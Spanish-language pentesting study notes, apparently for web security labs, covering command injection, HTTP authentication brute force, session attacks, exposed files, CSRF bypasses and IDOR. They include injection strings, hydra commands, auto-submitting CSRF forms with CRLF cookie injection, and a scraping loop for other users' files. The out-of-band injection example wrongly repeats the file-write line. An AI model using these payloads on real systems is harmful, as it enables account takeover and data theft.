## Command Injection:
La ejecución de codigo puede ser desde diferente perspectiva, pero el objetivo es realizar una ejecución de codigo del lado del servidor abusando de funciones en el codigo, por ejemplo:

1. En PHP: system(), exec(), shell_exec(), passthru()
2. En Python: os.system(), subprocess.call(), etc.
3. En Node.js: child_process.exec()

El objetivo es lograr que ejecuta una segunda operación, aparte de la original

### Operadores comunes:
1. ```;```
   - Ejecuta varios comandos uno tras otro, sin importar si el primero falla. Ejemplo: ping 8.8.8.8 ; whoami
2. ```&&```
   - Ejecuta el segundo comando solo si el primero fue exitoso. Ejemplo: ping 127.0.0.1 && id
3. ```||```
   - Ejecuta el segundo comando solo si el primero falla. Ejemplo: ping 0.0.0.0 || echo fallo
4. ```&```
   - Ejecuta el primer comando en segundo plano. Ejemplo: sleep 10 &
5. ```|```
  - Usa la salida del primer comando como entrada del segundo (pipe). Ejemplo: cat /etc/passwd | grep root
6. ```>```
  - Redirige la salida a un archivo (sobrescribe). Ejemplo: ls > salida.txt
6. ```>>```
   - Redirige la salida y la agrega al final de un archivo. Ejemplo: echo hola >> log.txt
7. ```2>```
   - Redirige los errores a un archivo. Ejemplo: cat archivo.txt 2> errores.txt
8. ```2>/dev/null```
   - Silencia los errores (envía stderr al "basurero"). Ejemplo: cat archivo.txt 2>/dev/null
9. ```$(comando)```
   - Ejecuta el comando y lo reemplaza por su salida. Ejemplo: echo $(whoami)

**NOTA**: Para mayor referencia revisa la sección de payloads de intruder

### Doble ejecución de comandos:
Para hacer exfiltración de datos, lo más sencillo es colocar un segundo comando dentro del comando usado para exfiltrar, en linux existen estos auxiliares:

1. ``` `whoami` ```
2. ``` $(whoami) ```

**NOTA**: A veces necesitaras ingresarlas dentro de un "" o un ' '.

### Tipos:

1. Blind:
   - Escritura en fichero: Primero puedes validarlo con un sleep, despues puede redireccionar la salida de comandos o leer ficheros y guardarlos en carpetas que usualmente son de estrictura como "imagenes", "css", etc. Habria que validar multiples metodos.
     - ```$(whoami > /var/www/images/a.jpg)```
   - Out-of-Band: Sí el servidor tiene salida a internet, podemos contactar y sacar información a un servidor externo.
     -  ```$(whoami > /var/www/images/a.jpg)```

## HTTP Authentication:
Proceso de autenticación simplificado otorgado por web servers, con el principal defecto de ser suceptibles a fuerza bruta.

1. Basic Auth:
   - hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt 192.168.x.x http-get /basic-auth/
   - curl -u admin:cookie1 192.209.143.3/basic/

3. Digest Auth:
   - hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt 192.168.x.x http-get /digest-auth/
   - curl --digest -u admin:adminpasswd 192.209.143.3/digest-auth/
  
## Login authentication:
Existen muchos tipos de ataques para sistemas de acceso, pero un listado puede ser:

1. Acceso por usuario y contraseña:
   - Texto plano: Sí van por texto plano es facil hacer un ataque de fuerza bruta o robarla sí viaja por canales inseguros.
   - Contraseña Cifrada: La contraseña podria ir cifrada, pero recordemos el cifrado ocurre del lado del cliente, entonces podemos leer el fichero de js encarado de hacer el cifrado o hashing, y replicar el proceso.

2. Acceso por OTP:
   - Sin limite: Sino hay limite de request en la validación, con un simple ataque de fuzzing podriamos acceder.
  
## Session Hijacking & Fixation:

1. Hijacking: Robo de la sesión de otro usuario, mediante el robo de tokens o identificadores de sesiones, permitiendo imitar al usuario real.
   - Session tampering: Sí el contenido del token o cookie no está cifrada y trae información modificable, por ejemplo, sí el valor es una cuenta admin o normal.
   - Session Prediction: Sí el identificador es facil de adivinar.
   - Session Sniffing: Interceptar el identificador sí viaja por canales inseguros.
   - XSS: Robo por ejecución de scripts de JS maliciosos en el navegador del usuario.

2. Fixation: Insertar un identificador a la victima, siendo un valor conocido por el atacante, para que al realizar la autenticación, ya conozca el ID a usar en la sesión, esto puede ocurrir en varias formas como:
   - El atacante envia una liga a la victima, con una URL que coloca un identificar de sesión al cliente.
   - Hacer que la victima haga click en un boton malicioso.
   - Provocar que la victima con ingeniera social que usa un metodo especifico para iniciar sesión.

   
## Exposición de datos sensibles:
Permitir la lectura de ficheros, provocar errores o leer los ficheros js, puede darnos mucha información:

1. Ficheros intencionales: Son aquellos que son necesarios para el funcionamiento normal de una aplicación, y deben estar expuestos pero a veces son demasiado especificos.
   - robots.txt: Fichero donde se pone directorios o ficheros que no se quiere que se indexe.
   - sitemap.xml: Fichero donde se pone directorios o ficheros que no quiere que se indexe.
   - crossdomain.xml: Usado por flash apps, pero puede permitir accesos indebidos.
   - security.txt: Fichero con información sobre el responsable de seguridad, pero puede contener más información.

2. Ficheros no intencionales: Son aquellos que las herramientas, servidor web, etc. crean por defecto, pero que tambien un usuario puede crear pensando que nadie lo encontrara.
   - Creados por servicios:
     - .git Carpeta usada por git para seguimiento del proyecto que contiene información sensible como el codigo.
     - .svn Carpeta usada por subversion (similar a git) para seguimiento del proyecto que contiene información sensible como el codigo.
     - .env	Ficheros del ambiente del sistema que pueden contener claves de acceso
     - server-status Pagina generada por apache "mod_status" para dar seguimiento al estatus del servidor
     - .DS_Store Carpeta creada por MAC que puede contener información del servidor
     - debug.log Ficheros de depuración y logs colocados dentro de la carpeta del web server
     - swagger.json, api-docs.json, openapi.json Ficheros con información sobre como funcionan las API
   - Subidos por el usuario:
     - backup.zip Respaldos creados en la misma carpeta del servidor
     - config.phg.old Respaldos individuales de ficheros
     - database.sql Ficheros de base de datos o configuraciones locales

3. Provocar errores: Dependera mucho del tipo de web server, pero el que es más facil es IIS.
   - Podemos encontrar información sensible como:
     - Versiones de la tecnologia.
     - Path donde está instalado
   - Metodos para provocar errores:
     - 404 Fichero no existente
     - Metodos HTTP no existentes
     - URL Mal formados, como admin%00.php

4- Ficheros: Ficheros comunes como JS, JSON, HTML, etc. Pueden contener información sensible pero al ser muy largos pueden pasarse por alto.
   - Buscar metodos ocultos, URL, tokens, comentarios, etc.

## CSRF:
Cross site request forgery, es cuando el servidor permite ejecutar funciones confiando en que provienen legitimamente del navegador del usuario.

1. Inyección de forms: A traves de un form malicioso se inyecta parametros ocultos y un action a la liga suceptible.
2. Ligas maliciosas: Ligas con parametros GET que al ejecutarse toma la sesión activa del usuario y realiza el ataque.
3. Ficheros HTML: Ficheros html que al abrirse en automatico ejecuten un script que redireccione con un form a la URL vulnerable.

### Medidas comunes:
Medidas comunes que usan las aplicaciones para evitar CSRF es:

#### CSRF:
1. El servidor inyecta un token random en cada formulario o en una cookie.
```html
<input type="hidden" name="csrf_token" value="4f92ef1c-f74e-4f8b-b0c3-a61cf8fadc31">
```
```
X-CSRF-Token
```
3. El cliente envia el token en cada request.
4. El servidor valida que ese token coincida con el de la sesión del usuario.
5. El servidor valida que el Referer o Origin coincida con dominios de confianza.

#### SameSite Cookies:
Cookies con la bandera samesite no permiten compartir información con otros sitios, aunque los navegadores modernos como chrome, ya implementan medidas ligeras para evitar el robo de cookies.

#### Referer-based validation:
Se valida que el origen previo del request sea de una lista de dominios de confianza.

### Autoejecución del Form:
Es clave el metodo a usar para ejecutar en automatico acciones al ingresar y redireccionar al usuario con la información maliciosa, enumeraremos algunas:

1. Script de Javascript:
```html
<script>
  document.forms[0].submit();
</script>

<script>document.getElementById('EL').submit()</script>
```

2. Carga de evento:
```html
<body onload="document.forms[0].submit()">

<img scr="https..primerpayload" onerror="document.forms[0].submit()">
```

### Ejemplos de ataques:

#### Sin evasión:
1. Basico sin protección por POST:
```html
<body onload="document.forms[0].submit()">
<form action="https://academy.net/my-account/change-email" method="POST">
<input name="email" type="hidden" value="email=evaa@aa.com">
</form>
```

2. Basico sin protección por GET:
```html
<img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"></img>
```

### Tipos de evasiones de CSRF:
1. Metodo alterno sin validación del token:
   - Modificando el request original de POST a GET y validando sí por GET no pide el token y permite ejecutar la acción.
2. Eliminar el valor del input:
   - Algunas aplicaciones cuando no detectan que el request venga el parametro anticsrf lo dejan pasar como un request valido.
3. CSRF de otro usuario:
   - Algunas aplicaciones no validan sí el token solo es valido para un solo usuario, entonces sí usas otro que este vivo, podria aceptar el request.
   - NOTA: Usualmente los tokens necesitan estar vivos y no haber sido usados, por lo que habra que generar tokens nuevos con otro usuario.
4. CSRF Token no asociado a cookie de sesión:
   - Sí el token anticsrf no está asociado a una sesión como tal, podria ser suceptible a que nosotros inyectemos el valor de la cookie y usemos una cookie y token anticsrf vivo de otro usuario.
   - Para el proceso debemos encontrar una forma de inyectar una cookie, luego enviar el form con el token anticsrf:
```html
<img src="https://0a040003045e54fc80fe5da8009d00ae.web-security-academy.net/?search=select;%0d%0aSet-Cookie:%20csrfKey=fhwsPNTQe3UQ2IVYHKgVUThQUZ73TxYZ;+SameSite=None" onerror="document.forms[0].submit()"></img>

<form id="EL" action="https://0a040003045e54fc80fe5da8009d00ae.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="aqq@cacc.com">
  <input type="hidden" name="csrf" value="ZOjQ62csUcMyXo5bsBAbd7ARJQXvKqRC">
</form>
```
5. CSRFToken validado por estar tambien en una cookie:
   - Sí el servidor solo hace la validación del token CSRF en base a que el token sea al igual del request podria provocar que sí se tiene una función donde podamos inyectar cookies, podamos inyectar una cookie nuestra y duplicarla en el request, por ejemplo:
```
GET /...
Cookie: csrfkey=222

User=1&csrfkey=222
```
  - En base un payload similar a:
```html
<img src="https://a.web-security-academy.net/?search=select;%0d%0aSet-Cookie:%20csrf=I4R9vWYU4GCbDeWhAf1pEuoNx1Ou9jpm;+SameSite=None" onerror="document.forms[0].submit()"></img>

<form id="EL" action="https://a.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="aqq@cacc.com">
  <input type="hidden" name="csrf" value="I4R9vWYU4GCbDeWhAf1pEuoNx1Ou9jpm">
</form>
```
6. Evasión de politicas SameSite en cookies:
  - LAX: El procedimiento más sencillo es abusar de cookies con la politica colocada como Lax.
    - Buscar request que sean aceptado por GET.
    - Tambien se pueden Se usan frameworks de desarrollo que sobre-escriban el metodo por ejemplo "Symfony", sí la pagina solo acepta request por POST, podemos hacer que la información viaje por GET y despues el framework de desarrollo la convierta a POST antes de ser procesada por la función de validación.
    - **Esto dependera completamente del framework**:
      - En Rails, Laravel, Symfony, CodeIgniter → _method es aceptado directamente o con mínima configuración.
      - En Node.js, Spring MVC, ASP.NET, Django, Flask → necesitas habilitar o instalar algo para que lo soporte, y el nombre puede cambiar.
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="GET">
    <input type="hidden" name="_method" value="POST">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```
    - Casos excepcionales:
      - Sí el tag de LAX fue agregado por el navegador, y no fue colocado en el codigo, chrome no aplica la regla en los primeros 120 segundos.
      
  - STRICT: Tambien se podria abusar de strict, pero es más complicado:
    - Inyectar un form o liga en un subdominio vulnerable que permita guardar o ejecutar en directo una redirección, y redireccionarlo la URL que permita modificar datos.
    - Redirección directa:

```html
<script>
    window.location.assign("https://1.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=afa@a.com%26submit=1");
</script>
```

    - Redirección almacenada: Realizada atraves de paginas que permitan almacenar ligas o URL de forma directa en comentarios, documentos, etc. o a traves de inyección de XSS.


## IDOR:
Mal asignación de permisos para ver recursos que solo deberian pertenecerle a un usuario, ejemplo: /read.php?file=reporte_enero.pdf sí esté URL es accesible para todos los usuarios pero solo deberia poder verlo quien lo subio.

- URL Parameters, JSON & APIs:
  - El más simple, userid=1000&credencial=ine.pdf, modificamos el userid y vemos otras credenciales.
- AJAX or JS Calls:
  - Funciones ocultas en javascript o ajax que no deberian poder ser llamadas, por ejemplo sí estamos en un panel normal donde hay un login para empleados, pero existe un parametro oculto llamado is_admin, que pasaria sí le dijieramos si somos admin en vez de no somos?
```
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```
- Understand Hashing/Encoding
  - Bastante comun que las referencias son encodeadas o hasheadas como metodo de ocultar la información, pero que si conocemos la estructura y función usada podemos tambien modificar los datos.
  - ?filename=ZmlsZV8xMjQucGRm (BASE64) -> ?filename=file_124.pdf
  - Sino podemos saber que función se está usando podriamos tratar de verlo en JS Ajax.
```
$.ajax({
    url:"download.php",
    type: "post",
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```
- Compare User Roles:
  - Sí tenemos la posibilidad de crear varios usuarios podriamos ver diferencias de valores o variables en los parametros entre cada usuario, intentando usar el valor del segundo usuario creado, no todos los parametros son tan obvios que son la referencia a otro usuario.
```
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/d100/salaries/15ab"
    },
  "Id" : "1",
  "Name" : "User1"

}
```
  - Por ejemplo sí notamos que el valor entre services y salaries es un valor variable que sí modificamos nos tre información de otro servicio de otro usuario.

- Herramientas: Lo más sencillo es usar intruder, pero en ciertas certs o sino tenemos la licencia se podria complicar, una forma manual seria:
  - curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
    - Buscamos patrones donde aparezca información relacionada a otros usuarios, pero para hacerlo automatizado podemos:
```
#!/bin/bash

url="http://SERVER_IP:PORT"
for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```














